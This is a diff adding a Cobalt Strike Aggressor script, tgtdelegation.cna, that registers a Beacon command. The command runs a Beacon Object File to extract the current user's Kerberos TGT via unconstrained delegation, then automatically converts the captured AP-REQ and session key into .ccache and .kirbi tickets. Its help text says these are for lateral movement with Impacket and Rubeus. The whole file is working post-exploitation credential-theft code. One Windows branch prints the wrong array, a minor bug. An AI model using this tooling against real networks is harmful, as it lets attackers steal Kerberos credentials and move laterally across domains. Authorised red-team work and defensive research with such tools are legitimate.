@@ -1,0 +1,275 @@
+# tgtdelegation.cna
+# Author: Connor McGarr (@33y0re)
+
+# Global variable for tgtdelegation
+# Generating the hash of the operator's alias, to ensure each output is unique to avoid duplicate parsing
+global('$jobNonce');
+global('$needle');
+$jobNonce = uint([[new String: mynick()] hashCode]);
+$needle = "[+] Job nonce: $jobNonce";
+
+# Global variable needed for parsing AP-REQ response in beacon_output in tgtdelegation
+global('$apreqBlob');
+$apreqBlob = "";
+
+# Register help/usage for tgtdelegation
+beacon_command_register(
+"tgtdelegation",
+"tgtdelegation: Obtain a usable Kerberos TGT",
+"\ntgtdelegation: Obtain a usable Kerberos TGT\n".
+"\nUsage: tgtdelegation [FQDN/currentdomain]\n".
+"\ntgtdelegation is Beacon Object File that is used to obtain a usable TGT for the current user. This data blob is passed to tgtParse.py/tgtParser.exe automatically, via tgtdelegation.cna, to be leveraged as a usable .ccache for lateral movement with Impacket and other supported tools over Kerberos. You may specify a domain or pull the current domain. Additionally, you may specify a SPN or use a default SPN for CIFS/PDC.DOMAIN.LOCAL. This SPN argument is available in case the default SPN is not configured for unconstrained delegation. Please see the tgtdelegation README.md more usage.\n".
+"\nExample usage 1: tgtdelegation currentdomain default\nExample usage 2: tgtdelegation DOMAIN.LOCAL CIFS/FILESERVER.MARVEL.LOCAL\n"
+);
+
+# Setup tgtdelegation
+alias tgtdelegation {
+
+  # Alias for Beacon ID and args
+  local('$bid $barch $domain $targetspn');
+
+  # Set the number of arguments
+  ($bid, $domain, $targetspn) = @_;
+
+  # Determine the amount of arguments
+  if (size(@_) != 3)
+  {
+      berror($bid, "Error! Please enter a domain and a SPN argument!");
+      berror($bid, "For more information please see 'help tgtdelegation'");
+			return;
+  }
+
+	# Get the architecture of the Beacon
+	$barch = barch($bid);
+
+  # Read in the BOF
+  $handle = openf(script_resource("Compiled/tgtdelegation. $+ $barch $+ .o"));
+  $data = readb($handle, -1);
+  closef($handle);
+
+  # Pack the arguments
+  # 'Z' is a zero-terminated UTF-16 string
+	# 'i' is an integer
+  $args = bof_pack($bid, "iZZ", $jobNonce, $domain, $targetspn);
+
+  # Run the BOF
+  # go = Entry point of the BOF
+  beacon_inline_execute($bid, $data, "go", $args);
+}
+
+# tgtdelegation specific parser
+# Parse the output in order to get the 2 Base64 encoded blobs (AP-REQ + Kerberos session key) into variables for automatic Python parsing
+on beacon_output
+{
+	$kerbBlob = "";
+
+	# Identify when we get the output
+	if ($needle isin $2)
+	{
+		# Split the output into an array, parsing by newline characters, and index the array at the appropriate indexes to obtain AP-REQ + Kerberos Session Key blobs
+		$temp = split("\n", $2);
+		$apreqBlob = $temp[4];
+		$kerbBlob = $temp[7];
+		$etype = $temp[10];
+
+		# Construct tgtParse.py command
+		# Mac and Linux only
+		local('@pyCmd');
+		@pyCmd[0] = "python3.9";
+		@pyCmd[1] = script_resource("tgtParse/tgtParse.py");
+		@pyCmd[2] = "--apreq";
+		@pyCmd[3] = $apreqBlob;
+		@pyCmd[4] = "--sessionkey";
+		@pyCmd[5] = $kerbBlob;
+		@pyCmd[6] = "--etype";
+		@pyCmd[7] = "$etype";
+
+		# Construct tgtParse.exe command
+		# Windows only
+		local('@pyCmd1');
+		@pyCmd1[0] = script_resource("tgtParse/tgtParse.exe");
+		@pyCmd1[1] = "--apreq";
+		@pyCmd1[2] = $apreqBlob;
+		@pyCmd1[3] = "--sessionkey";
+		@pyCmd1[4] = $kerbBlob;
+		@pyCmd1[5] = "--etype";
+		@pyCmd1[6] = "$etype";
+
+		# Determine the OS
+		$operatingSystem = systemProperties()["os.name"];
+		if ("Linux" isin $operatingSystem || "Mac OS X" isin $operatingSystem)
+		{
+		  # Print update
+		  blog($1, "Invoking tgtParse.py to obtain a usable .ccache!\n");
+
+		  println("Executing tgtParse.py: " . join(' ', @pyCmd));
+
+		  # Execute
+		  $execute = exec(@pyCmd);
+		  $return = wait($execute);
+
+		  if ($return != 0)
+		  {
+		    println("[-] Error running tgtParse.py. Python return code:")
+		    println($return)
+		    berror($1, "Error! tgtParse.py failed to decrypt the AP-REQ response!\n");
+
+		    # Store output from tgtParse.py into a
+		    @arrayOut = (readAll($execute));
+
+		    # Print to the operator where the .ccache is located
+		    blog($1, @arrayOut);
+
+		    return;
+		  }
+		  else
+		  {
+		    blog($1, "Successfully decrypted the AP-REQ response!\n");
+
+		    # Store output from tgtParse.py into a
+		    @arrayOut = (readAll($execute));
+
+		    # Print to the operator where the .ccache is located
+		    blog($1, @arrayOut[-1]);
+
+				# Identify the full path to the .ccache
+				# $ccachepathTemp currently is "Local path to usable .ccache: /PATH/TO/BLAH.ccache"
+				$ccachepathTemp = @arrayOut[-1];
+
+				# Parse string by spaces to load the full path to the .ccache in its own variable for usage with ticketConverter.py
+				@splitstringTemp = split(" ", $ccachepathTemp);
+
+				# The full path is the sixth element of the array
+				$ccachePath = @splitstringTemp[5];
+
+				# Replace .ccache with .kirbi for the output file of the .kirbi
+				$kirbiPath = strrep($ccachePath, ".ccache", ".kirbi");
+
+				# Construct ticketConverter.py command
+				# Mac and Linux only
+				local('@pyCmd2');
+				@pyCmd2[0] = "python3.9";
+				@pyCmd2[1] = script_resource("tgtParse/ticketConverter.py");
+				@pyCmd2[2] = $ccachePath;
+				@pyCmd2[3] = $kirbiPath;
+
+				# Print update
+			  println("Executing ticketConverter.py: " . join(' ', @pyCmd2));
+
+				$execute1 = exec(@pyCmd2);
+			  $return1 = wait($execute1);
+
+			  if ($return1 != 0)
+			  {
+			    println("[-] Error running ticketConverter.py. Python return code:")
+			    println($return)
+			    berror($1, "Error! ticketConverter.py failed to convert the .ccache to .kirbi! Please manually invoke ticketConverter.py from the Impacket suite directly.\n");
+
+			    # Store output from ticketConverter.py into an array
+			    @arrayOut1 = (readAll($execute1));
+
+			    # Print to the operator where the .kirbi is located
+			    blog($1, @arrayOut1);
+
+			    return;
+			  }
+			  else
+			  {
+			    # Store output from ticketConverter.py into a
+			    @arrayOut1 = (readAll($execute1));
+
+					# Print to the operator where the .kirbi is located
+					blog($1, @arrayOut1[1]);
+
+					# Print the base64 encoded .kirbi for easy usage with Rubeus
+					blog($1, "Base64 encoded .kirbi: \n" . @arrayOut1[2]);
+				}
+		  }
+		}
+		else
+		{
+		  println("Executing tgtParse.exe: " . join(' ', @pyCmd1));
+
+		  # Execute
+		  $execute = exec(@pyCmd1);
+		  $return = wait($execute);
+
+		  if ($return != 0)
+		  {
+		    println("[-] Error running tgtParse.exe. Python return code:")
+		    println($return)
+		    berror($1, "Error! tgtParse.exe failed to decrypt the AP-REQ response!\n");
+
+		    # Store output from tgtParse.exe into a
+		    @arrayOut = (readAll($execute));
+
+		    # Print to the operator where the .ccache is located
+		    blog($1, @arrayOut);
+
+		    return;
+		  }
+		  else
+		  {
+		    blog($1, "Successfully decrypted the AP-REQ response!\n");
+
+		    # Store output from tgtParse.exe into a
+		    @arrayOut = (readAll($execute));
+
+		    # Print to the operator where the .ccache is located
+		    blog($1, @arrayOut[-1]);
+
+				# Identify the full path to the .ccache
+				# $ccachepathTemp currently is "Local path to usable .ccache: C:\Path\to\BLAH.ccache"
+				$ccachepathTemp = @arrayOut[-1];
+
+				# Parse string by spaces to load the full path to the .ccache in its own variable for usage with ticketConverter.exe
+				@splitstringTemp = split(" ", $ccachepathTemp);
+
+				# The full path is the sixth element of the array
+				$ccachePath = @splitstringTemp[5];
+
+				# Replace .ccache with .kirbi for the output file of the .kirbi
+				$kirbiPath = strrep($ccachePath, ".ccache", ".kirbi");
+
+				# Construct ticketConverter.exe command
+				# Windows only
+				local('@pyCmd3');
+				@pyCmd3[0] = script_resource("tgtParse/ticketConverter.exe");
+				@pyCmd3[1] = $ccachePath;
+				@pyCmd3[2] = $kirbiPath;
+
+				# Print update
+				println("Executing ticketConverter.exe: " . join(' ', @pyCmd3));
+
+				$execute2 = exec(@pyCmd3);
+				$return2 = wait($execute2);
+
+				if ($return2 != 0)
+				{
+					println("[-] Error running ticketConverter.exe. Python return code:")
+					println($return)
+					berror($1, "Error! ticketConverter.exe failed to convert the .ccache to .kirbi! Please manually invoke ticketConverter.py from the Impacket suite directly.\n");
+
+					# Store output from ticketConverter.exe into an array
+					@arrayOut2 = (readAll($execute2));
+
+					# Print to the operator where the .kirbi is located
+					blog($1, @arrayOut2);
+
+					return;
+				}
+				else
+				{
+					# Store output from ticketConverter.exe into a
+					@arrayOut2 = (readAll($execute2));
+
+					# Print to the operator where the .kirbi is located
+					blog($1, @arrayOut2[1]);
+
+					# Print the base64 encoded .kirbi for easy usage with Rubeus
+					blog($1, "Base64 encoded .kirbi: \n" . @arrayOut1[2]);
+				}
+		  }
+		}
+	}
+}
